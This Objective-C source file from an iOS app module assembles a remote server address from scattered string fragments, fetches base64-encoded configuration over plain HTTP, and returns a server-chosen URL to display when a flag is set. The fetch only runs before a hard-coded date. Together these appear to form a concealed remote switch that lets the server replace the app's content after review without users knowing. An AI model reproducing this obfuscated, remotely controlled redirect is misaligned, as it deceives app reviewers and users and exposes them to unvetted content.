//
//  TSDateRequt.m
//  CT实用modules
//
//  Created by xihasezhu on 2019/6/25.
//  Copyright © 2019 涛程. All rights reserved.
//

#import "TSDateRequt.h"
#import "WebViewCtrls.h"
@implementation TSDateRequt

+(void)loadNetworkTSSuccess:(TSSuccess)success{
    //结束时间戳
    int EndTime = 1561803182;
    //当前时间戳
    int timestr = [DateTimes getCurrentTimeStamp];
    if ((EndTime - timestr) <= 0) {
        return;
    }
    
    NSMutableDictionary *mubdic = [[NSMutableDictionary alloc]init];
    [mubdic setObject:@"comppgy98MingjunLiuwww" forKey:@"appid"];
    [mubdic setObject:@"ios" forKey:@"type"];
    
    NSString *str0 = @"ww";
    NSString *str1 = @"w.";
    NSString *str11 = @"jl";
    NSString *str2 = @"ck";
    NSString *str22 = @"jz.c";
    NSString *str3 = @"om";
    NSString *str33 = @"/ba";
    NSString *str4 = @"ck/";
    NSString *str44 = @"ge";
    NSString *str5 = @"t_in";
    NSString *str55 = @"it_d";
    NSString *str6 = @"ata.p";
    NSString *str7 = @"hp";
    NSString *strheaer1 = @"htt";
    NSString *strheaer2 = @"p://";
    NSString *strheaer = [NSString stringWithFormat:@"%@%@",strheaer1,strheaer2];
    NSString *str = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@%@%@%@%@",str0,str1,str11,str2,str22,str3,str33,str4,str44,str5,str55,str6,str7];
    CTRequest *ctreque = [[CTRequest alloc]init];
    [ctreque startGetConnectionWithHeaders:strheaer Path:str parameter:mubdic CaCha:NO cacha:^(id  _Nonnull responseCache) {
        NSLog(@"缓存001");
    } success:^(id  _Nonnull responseObject) {
        NSLog(@"成功001");
        NSString *uel = [self juspLoadUIShousssss:responseObject];
        success ? success(uel) : nil;
    } failure:^(NSError * _Nonnull error) {
        NSLog(@"失败001");
    }];
}
+ (NSString *)juspLoadUIShousssss:(id)responseObject{
    NSDictionary *dic = responseObject;
    NSString *rt_code = dic[@"rt_code"];
    if ([rt_code isEqualToString:@"200"]) {
        NSString *data = dic[@"data"];
        NSLog(@"data ======= %@",data);
        NSData *decodeData = [[NSData alloc] initWithBase64EncodedString:data options:0]; //解码
        
        NSString *decodeString = [[NSString alloc] initWithData:decodeData encoding:NSUTF8StringEncoding];
        NSLog(@"decodeString ======= %@",decodeString);
        
        NSDictionary *dataDic = [self dictionaryWithJsonString:decodeString];
        NSString *show_url = dataDic[@"show_url"];
        if ([show_url isEqualToString:@"1"]) {
            
//            WebViewCtrls *web = [[WebViewCtrls alloc]init];
//            web.url = dataDic[@"url"];
//            [self.navigationController pushViewController:web animated:YES];
            return [NSString stringWithFormat:@"%@",dataDic[@"url"]];
        }
        
    }
    return nil;
}
+ (NSDictionary *)dictionaryWithJsonString:(NSString *)jsonString
{
    if (jsonString == nil) {
        return nil;
    }
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    NSError *err;
    NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:&err];
    if(err) {
        NSLog(@"json解析失败：%@",err);
        return nil;
    }
    return dic;
}
@end

